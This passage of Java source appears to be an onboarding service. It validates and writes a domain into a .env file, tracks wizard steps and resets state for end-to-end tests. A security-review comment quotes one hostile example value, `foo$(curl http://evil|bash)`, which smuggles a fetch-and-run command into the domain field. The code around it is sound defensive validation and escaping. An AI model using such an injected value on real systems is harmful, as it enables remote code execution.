    settings.put(KEY_STEP, "domain");
    return id;
  }

  /** Update .state.yml + packages/core/.env's DOMAIN. */
  public void setDomain(String domain) {
    if (domain == null || domain.isBlank()) throw new IllegalArgumentException("domain required");
    String normalized = domain.trim().toLowerCase();
    if (!DOMAIN_PATTERN.matcher(normalized).matches()) {
      // Security-review B-1 (2026-08-02, HIGH): the domain string flows
      // through OnboardingService → upsertCoreEnvDomain → packages/core/.env
      // → scripts/up.sh which sources it with `. "$ef"`. That's bash eval:
      // an unvalidated value like `foo$(curl http://evil|bash)` would run.
      // We defend in three layers:
      //   (a) here — strict shape (RFC 1123-ish, 2+ labels, ≤ 253 chars)
      //   (b) quote-escape at .env write (see upsertCoreEnvDomain)
      //   (c) up.sh switching to `docker compose --env-file` (v0.2 backlog)
      // Rejecting the request with 400 is honest and cheap.
      throw new IllegalArgumentException(
          "domain must be a valid DNS name (letters, digits, hyphens, at least one dot)");
    }
    stateFiles.writeDomain(normalized);
    upsertCoreEnvDomain(normalized);
    audit.record(null, "onboarding.domain.set", "domain:" + normalized, null);
    // Advance the server-side step cursor forward but never backward.
    //
    // Used to jump to "packages" here, then "packages" itself jumped
    // straight to "secrets" (skipping "sso" as a resumable hint value —
    // that was already the case before the picker step was removed, and
    // is left unchanged). Now that there is no picker step in between,
    // domain jumps directly to the same "secrets" end-state in one go.
    if (rank(currentStep()) < rank("secrets")) settings.put(KEY_STEP, "secrets");
  }

  public void setEnabledPackages(List<String> enabled) {
    if (packageNames != null) packageNames.validate(enabled);
    stateFiles.writeEnabled(enabled == null ? List.of() : enabled);
    audit.record(null, "onboarding.packages.set", null,
        "{\"enabled\":" + toJsonArray(enabled) + "}");
    if (rank(currentStep()) < rank("secrets")) settings.put(KEY_STEP, "secrets");
  }

  public void markComplete() {
    settings.put(KEY_COMPLETE, "true");
    settings.put(KEY_STEP, "done");
    audit.record(null, "onboarding.complete", null, null);
  }

  /**
   * TD5 (2026-08-02): wipe every trace of a completed or in-progress
   * onboarding, returning the box to bootstrap mode. Intended solely for
   * the E2E-only {@code POST /api/onboarding/reset} endpoint so
   * Playwright suites can rewind between specs — the whole
   * wizard-happy-path family (BL5 aftermath) needs a clean fixture.
   *
   * <p>Scope, in order:
   * <ol>
   *   <li>All admin users deleted (session cookies naturally lose their
   *       backing row; subsequent /api/auth/me returns 401).</li>
   *   <li>Every {@code onboarding.*} settings row deleted — complete,
   *       step, dns_mode. On the next hydrate the wizard defaults to
   *       {@code step=welcome}.</li>
   *   <li>{@code .state.yml} deleted so
   *       {@link StateFileService#readState()} yields the empty default
   *       ({@code enabled=[]}, no domain, no hostname).</li>
   * </ol>
   *
   * <p>Idempotent — safe to call on an already-reset box. Audits the
   * event so a live prod misuse (should be prevented by the controller
   * gate) leaves a paper trail.
   */
  public void reset() {
    users.deleteAll();
    settings.delete(KEY_COMPLETE);
    settings.delete(KEY_STEP);
    settings.delete(KEY_DNS_MODE);
    stateFiles.deleteState();
    audit.record(null, "onboarding.reset", null, null);
  }

  // --- .env mutation (v0.1: only the DOMAIN key in packages/core/.env) ---

  private static final Pattern DOMAIN_LINE = Pattern.compile("^\\s*DOMAIN\\s*=.*$");

  /**
   * Strict RFC 1123-ish DNS label validation. Two or more labels required
   * (so bare hostnames like {@code aurora} are rejected), each label 1–63
   * chars from {@code [a-z0-9-]} not starting or ending with a hyphen, total
   * length ≤ 253. Deliberately narrower than RFC 1123 (no leading digits
   * in labels) to make the character class small enough that anything the
   * bash source of {@code packages/core/.env} could execute is impossible.
   *
   * <p>Any change here — especially widening the character class — must
   * re-audit {@link #upsertCoreEnvDomain} single-quote escaping and the
   * eventual {@code up.sh} env-file parser.
   */
  static final Pattern DOMAIN_PATTERN = Pattern.compile(
      "^(?=.{1,253}$)([a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?)(\\.[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?)+$");

  private void upsertCoreEnvDomain(String domain) {
    Path env = Path.of(props.repoPath()).resolve("packages/core/.env");
    try {
      List<String> lines = Files.exists(env)
          ? new ArrayList<>(Files.readAllLines(env, StandardCharsets.UTF_8))
          : new ArrayList<>();
      boolean replaced = false;
      for (int i = 0; i < lines.size(); i++) {
        Matcher m = DOMAIN_LINE.matcher(lines.get(i));
        if (m.matches()) {
          lines.set(i, "DOMAIN=" + quoteForBash(domain));
          replaced = true;
          break;
        }
      }
      if (!replaced) lines.add("DOMAIN=" + quoteForBash(domain));
      String body = String.join("\n", lines) + "\n";
      Files.createDirectories(env.getParent());
      Files.writeString(env, body, StandardCharsets.UTF_8,
          StandardOpenOption.CREATE, StandardOpenOption.TRUNCATE_EXISTING);
      try {
        Files.setPosixFilePermissions(env,
            java.util.Set.of(java.nio.file.attribute.PosixFilePermission.OWNER_READ,
                             java.nio.file.attribute.PosixFilePermission.OWNER_WRITE));
      } catch (UnsupportedOperationException | IOException ignore) { /* non-posix fs */ }
    } catch (IOException e) {
      throw new RuntimeException("failed to write " + env, e);
    }
  }

  /**
   * Single-quote-escape a value for safe sourcing by bash ({@code . "$ef"}
   * in {@code scripts/up.sh}). Bash single-quoting suppresses variable and
   * command substitution; the only character that ends a single-quoted
   * string is another single-quote, which we escape by closing, injecting a
   * literal single-quote, and reopening: {@code '\''}. Combined with the
   * strict {@link #DOMAIN_PATTERN} shape check this is defense-in-depth
   * belt-and-braces — valid domains contain no single quotes so this is a
   * no-op today, but hardens future writers that may loosen the regex.
   */
  static String quoteForBash(String value) {
    return "'" + value.replace("'", "'\\''") + "'";
  }

  private static String toJsonArray(List<String> xs) {
    if (xs == null || xs.isEmpty()) return "[]";
    var sb = new StringBuilder("[");
    for (int i = 0; i < xs.size(); i++) {
      if (i > 0) sb.append(',');
      sb.append('"').append(xs.get(i).replace("\"", "\\\"")).append('"');
    }
    return sb.append(']').toString();
  }
}
